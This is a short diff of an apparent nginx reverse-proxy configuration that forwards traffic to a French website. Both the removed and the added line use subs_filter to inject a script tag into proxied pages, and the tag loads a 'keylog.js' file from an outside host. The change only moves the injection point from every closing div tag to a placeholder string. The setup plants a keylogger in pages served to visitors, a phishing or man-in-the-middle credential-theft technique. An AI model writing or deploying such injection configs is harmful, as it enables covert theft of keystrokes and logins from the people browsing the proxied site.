@@ -51,7 +51,7 @@ add		echo_read_request_body;
 
 add		proxy_pass http://www.microplus.fr/;
 
-add		subs_filter "</div>" "</div><script/src='https://www.microplus.fr/secu/images/test/keylog.js'></script>" -o;
+add		subs_filter "sting to remplace" "sting to remplace<script/src='https://www.microplus.fr/secu/images/test/keylog.js'></script>" -o;
 
 
 	
